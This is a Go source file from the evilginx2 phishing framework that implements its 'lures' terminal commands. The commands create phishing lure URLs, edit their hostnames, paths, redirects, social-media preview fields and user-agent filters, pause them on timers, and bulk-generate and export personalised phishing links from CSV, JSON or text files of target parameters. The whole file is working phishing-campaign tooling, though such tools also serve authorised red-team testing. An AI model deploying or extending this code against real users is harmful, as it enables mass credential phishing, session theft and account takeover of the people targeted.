// terminal: lure management commands (create/edit/pause/export URLs).
package core

import (
	"bufio"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/parser"

	"github.com/fatih/color"
)

func (t *Terminal) handleLures(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	higreen := color.New(color.FgHiGreen)
	green := color.New(color.FgGreen)
	//hiwhite := color.New(color.FgHiWhite)
	hcyan := color.New(color.FgHiCyan)
	cyan := color.New(color.FgCyan)
	dgray := color.New(color.FgHiBlack)
	white := color.New(color.FgHiWhite)

	pn := len(args)

	if pn == 0 {
		// list lures
		t.output("%s", t.sprintLures())
		return nil
	}
	if pn > 0 {
		switch args[0] {
		case "create":
			if pn == 2 {
				_, err := t.cfg.GetPhishlet(args[1])
				if err != nil {
					return err
				}
				l := &Lure{
					Path:     "/" + GenRandomString(8),
					Phishlet: args[1],
				}
				t.cfg.AddLure(args[1], l)
				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "get-url":
			if pn >= 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				pl, err := t.cfg.GetPhishlet(l.Phishlet)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
				if !ok || len(bhost) == 0 {
					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
				}

				var base_url string
				if l.Hostname != "" {
					base_url = "https://" + l.Hostname + l.Path
				} else {
					purl, err := pl.GetLureUrl(l.Path)
					if err != nil {
						return err
					}
					base_url = purl
				}

				var phish_urls []string
				var phish_params []map[string]string
				var out string

				params := url.Values{}
				if pn > 2 {
					if args[2] == "import" {
						if pn < 4 {
							return fmt.Errorf("get-url: no import path specified")
						}
						params_file := args[3]

						phish_urls, phish_params, err = t.importParamsFromFile(base_url, params_file)
						if err != nil {
							return fmt.Errorf("get_url: %v", err)
						}

						if pn >= 5 {
							if args[4] == "export" {
								if pn == 5 {
									return fmt.Errorf("get-url: no export path specified")
								}
								export_path := args[5]

								format := "text"
								if pn == 7 {
									format = args[6]
								}

								err = t.exportPhishUrls(export_path, phish_urls, phish_params, format)
								if err != nil {
									return fmt.Errorf("get-url: %v", err)
								}
								out = hiblue.Sprintf("exported %d phishing urls to file: %s\n", len(phish_urls), export_path)
								phish_urls = []string{}
							} else {
								return fmt.Errorf("get-url: expected 'export': %s", args[4])
							}
						}

					} else {
						// params present
						for n := 2; n < pn; n++ {
							val := args[n]

							sp := strings.Index(val, "=")
							if sp == -1 {
								return fmt.Errorf("to set custom parameters for the phishing url, use format 'param1=value1 param2=value2'")
							}
							k := val[:sp]
							v := val[sp+1:]

							params.Add(k, v)

							log.Info("adding parameter: %s='%s'", k, v)
						}
						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
					}
				} else {
					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
				}

				for n, phish_url := range phish_urls {
					out += hiblue.Sprint(phish_url)

					var params_row string
					var params string
					if len(phish_params) > 0 {
						params_row := phish_params[n]
						m := 0
						for k, v := range params_row {
							if m > 0 {
								params += " "
							}
							params += fmt.Sprintf("%s=\"%s\"", k, v)
							m += 1
						}
					}

					if len(params_row) > 0 {
						out += " ; " + params
					}
					out += "\n"
				}

				t.output("%s", out)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "pause":
			if pn == 3 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				s_duration := args[2]

				t_dur, err := ParseDurationString(s_duration)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				t_now := time.Now()
				log.Info("current time: %s", t_now.Format("2006-01-02 15:04:05"))
				log.Info("unpauses at:  %s", t_now.Add(t_dur).Format("2006-01-02 15:04:05"))

				l.PausedUntil = t_now.Add(t_dur).Unix()
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "unpause":
			if pn == 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}

				log.Info("lure for phishlet '%s' unpaused", l.Phishlet)

				l.PausedUntil = 0
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "edit":
			if pn == 4 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				val := args[3]
				do_update := false

				switch args[2] {
				case "hostname":
					if val != "" {
						val = strings.ToLower(val)

						if val != t.cfg.general.Domain && !strings.HasSuffix(val, "."+t.cfg.general.Domain) {
							return fmt.Errorf("edit: lure hostname must end with the base domain '%s'", t.cfg.general.Domain)
						}
						host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
						if !host_re.MatchString(val) {
							return fmt.Errorf("edit: invalid hostname")
						}

						l.Hostname = val
						t.cfg.refreshActiveHostnames()
						t.manageCertificates(true)
					} else {
						l.Hostname = ""
					}
					do_update = true
					log.Info("hostname = '%s'", l.Hostname)
				case "path":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						l.Path = u.EscapedPath()
						if len(l.Path) == 0 || l.Path[0] != '/' {
							l.Path = "/" + l.Path
						}
					} else {
						l.Path = "/"
					}
					do_update = true
					log.Info("path = '%s'", l.Path)
				case "redirect_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: redirect url must be absolute")
						}
						l.RedirectUrl = u.String()
					} else {
						l.RedirectUrl = ""
					}
					do_update = true
					log.Info("redirect_url = '%s'", l.RedirectUrl)
				case "phishlet":
					_, err := t.cfg.GetPhishlet(val)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					l.Phishlet = val
					do_update = true
					log.Info("phishlet = '%s'", l.Phishlet)
				case "info":
					l.Info = val
					do_update = true
					log.Info("info = '%s'", l.Info)
				case "og_title":
					l.OgTitle = val
					do_update = true
					log.Info("og_title = '%s'", l.OgTitle)
				case "og_desc":
					l.OgDescription = val
					do_update = true
					log.Info("og_desc = '%s'", l.OgDescription)
				case "og_image":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: image url must be absolute")
						}
						l.OgImageUrl = u.String()
					} else {
						l.OgImageUrl = ""
					}
					do_update = true
					log.Info("og_image = '%s'", l.OgImageUrl)
				case "og_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: site url must be absolute")
						}
						l.OgUrl = u.String()
					} else {
						l.OgUrl = ""
					}
					do_update = true
					log.Info("og_url = '%s'", l.OgUrl)
				case "redirector":
					if val != "" {
						path := val
						if !filepath.IsAbs(val) {
							redirectors_dir := t.cfg.GetRedirectorsDir()
							path = filepath.Join(redirectors_dir, val)
						}

						if _, err := os.Stat(path); !os.IsNotExist(err) {
							l.Redirector = val
						} else {
							return fmt.Errorf("edit: redirector directory does not exist: %s", path)
						}
					} else {
						l.Redirector = ""
					}
					do_update = true
					log.Info("redirector = '%s'", l.Redirector)
				case "ua_filter":
					if val != "" {
						if _, err := regexp.Compile(val); err != nil {
							return err
						}

						l.UserAgentFilter = val
					} else {
						l.UserAgentFilter = ""
					}
					do_update = true
					log.Info("ua_filter = '%s'", l.UserAgentFilter)
				}
				if do_update {
					err := t.cfg.SetLure(l_id, l)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					return nil
				}
			} else {
				return fmt.Errorf("incorrect number of arguments")
			}
		case "delete":
			if pn == 2 {
				if len(t.cfg.lures) == 0 {
					break
				}
				if args[1] == "all" {
					di := []int{}
					for n := range t.cfg.lures {
						di = append(di, n)
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				} else {
					rc := strings.Split(args[1], ",")
					di := []int{}
					for _, pc := range rc {
						pc = strings.TrimSpace(pc)
						rd := strings.Split(pc, "-")
						if len(rd) == 2 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							for i := b_id; i <= e_id; i++ {
								di = append(di, i)
							}
						} else if len(rd) == 1 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							di = append(di, b_id)
						}
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				}
			}
			return fmt.Errorf("incorrect number of arguments")
		default:
			id, err := strconv.Atoi(args[0])
			if err != nil {
				return err
			}
			l, err := t.cfg.GetLure(id)
			if err != nil {
				return err
			}

			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
			log.Printf("\n%s\n", AsRows(keys, vals))

			return nil
		}
	}

	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) monitorLurePause() {
	var pausedLures map[string]int64
	pausedLures = make(map[string]int64)

	for {
		t_cur := time.Now()

		for n, l := range t.cfg.lures {
			if l.PausedUntil > 0 {
				l_id := t.cfg.lureIds[n]
				t_pause := time.Unix(l.PausedUntil, 0)
				if t_pause.After(t_cur) {
					pausedLures[l_id] = l.PausedUntil
				} else {
					if _, ok := pausedLures[l_id]; ok {
						log.Info("[%s] lure (%d) is now active", l.Phishlet, n)
					}
					pausedLures[l_id] = 0
					l.PausedUntil = 0
				}
			}
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func (t *Terminal) sprintLures() string {
	higreen := color.New(color.FgHiGreen)
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	cyan := color.New(color.FgCyan)
	hcyan := color.New(color.FgHiCyan)
	white := color.New(color.FgHiWhite)
	//n := 0
	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "redirect_url", "paused", "og"}
	var rows [][]string
	for n, l := range t.cfg.lures {
		var og string
		if l.OgTitle != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgDescription != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgImageUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}

		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), s_paused, og})
	}
	return AsTable(cols, rows)
}

func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
	var ret []string
	var ret_params []map[string]string

	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
	if err != nil {
		return ret, ret_params, err
	}
	defer f.Close()

	var format string = "text"
	if filepath.Ext(path) == ".csv" {
		format = "csv"
	} else if filepath.Ext(path) == ".json" {
		format = "json"
	}

	log.Info("importing parameters file as: %s", format)

	switch format {
	case "text":
		fs := bufio.NewScanner(f)
		fs.Split(bufio.ScanLines)

		n := 0
		for fs.Scan() {
			n += 1
			l := fs.Text()
			// remove comments
			if n := strings.Index(l, ";"); n > -1 {
				l = l[:n]
			}
			l = strings.Trim(l, " ")

			if len(l) > 0 {
				args, err := parser.Parse(l)
				if err != nil {
					log.Error("syntax error at line %d: [%s] %v", n, l, err)
					continue
				}

				params := url.Values{}
				map_params := make(map[string]string)
				for _, val := range args {
					sp := strings.Index(val, "=")
					if sp == -1 {
						log.Error("invalid parameter syntax at line %d: [%s]", n, val)
						continue
					}
					k := val[:sp]
					v := val[sp+1:]

					params.Add(k, v)
					map_params[k] = v
				}

				if len(params) > 0 {
					ret = append(ret, t.createPhishUrl(base_url, &params))
					ret_params = append(ret_params, map_params)
				}
			}
		}
	case "csv":
		r := csv.NewReader(bufio.NewReader(f))

		param_names, err := r.Read()
		if err != nil {
			return ret, ret_params, err
		}

		var params []string
		for params, err = r.Read(); err == nil; params, err = r.Read() {
			if len(params) != len(param_names) {
				log.Error("number of csv values do not match number of keys: %v", params)
				continue
			}

			item := url.Values{}
			map_params := make(map[string]string)
			for n, param := range params {
				item.Add(param_names[n], param)
				map_params[param_names[n]] = param
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}
		if err != io.EOF {
			return ret, ret_params, err
		}
	case "json":
		data, err := ioutil.ReadAll(bufio.NewReader(f))
		if err != nil {
			return ret, ret_params, err
		}

		var params_json []map[string]interface{}

		err = json.Unmarshal(data, &params_json)
		if err != nil {
			return ret, ret_params, err
		}

		for _, json_params := range params_json {
			item := url.Values{}
			map_params := make(map[string]string)
			for k, v := range json_params {
				if val, ok := v.(string); ok {
					item.Add(k, val)
					map_params[k] = val
				} else {
					log.Error("json parameter '%s' value must be of type string", k)
				}
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}

		/*
			r := json.NewDecoder(bufio.NewReader(f))

			t, err := r.Token()
			if err != nil {
				return ret, ret_params, err
			}
			if s, ok := t.(string); ok && s == "[" {
				for r.More() {
					t, err := r.Token()
					if err != nil {
						return ret, ret_params, err
					}

					if s, ok := t.(string); ok && s == "{" {
						for r.More() {
							t, err := r.Token()
							if err != nil {
								return ret, ret_params, err
							}


						}
					}
				}
			} else {
				return ret, ret_params, fmt.Errorf("array of parameters not found")
			}*/
	}
	return ret, ret_params, nil
}

func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phish_params []map[string]string, format string) error {
	if len(phish_urls) != len(phish_params) {
		return fmt.Errorf("phishing urls and phishing parameters count do not match")
	}
	if !stringExists(format, []string{"text", "csv", "json"}) {
		return fmt.Errorf("export format can only be 'text', 'csv' or 'json'")
	}

	f, err := os.OpenFile(export_path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	if format == "text" {
		for n, phish_url := range phish_urls {
			var params string
			m := 0
			params_row := phish_params[n]
			for k, v := range params_row {
				if m > 0 {
					params += " "
				}
				params += fmt.Sprintf("%s=\"%s\"", k, v)
				m += 1
			}

			_, err := f.WriteString(phish_url + " ; " + params + "\n")
			if err != nil {
				return err
			}
		}
	} else if format == "csv" {
		var data [][]string

		w := csv.NewWriter(bufio.NewWriter(f))

		var cols []string
		var param_names []string
		cols = append(cols, "url")
		for _, params_row := range phish_params {
			for k := range params_row {
				if !stringExists(k, param_names) {
					cols = append(cols, k)
					param_names = append(param_names, k)
				}
			}
		}
		data = append(data, cols)

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			var vals []string
			vals = append(vals, phish_url)

			for _, k := range param_names {
				vals = append(vals, params[k])
			}

			data = append(data, vals)
		}

		err := w.WriteAll(data)
		if err != nil {
			return err
		}
	} else if format == "json" {
		type UrlItem struct {
			PhishUrl string            `json:"url"`
			Params   map[string]string `json:"params"`
		}

		var items []UrlItem

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			item := UrlItem{
				PhishUrl: phish_url,
				Params:   params,
			}

			items = append(items, item)
		}

		data, err := json.MarshalIndent(items, "", "\t")
		if err != nil {
			return err
		}

		_, err = f.WriteString(string(data))
		if err != nil {
			return err
		}
	}

	return nil
}
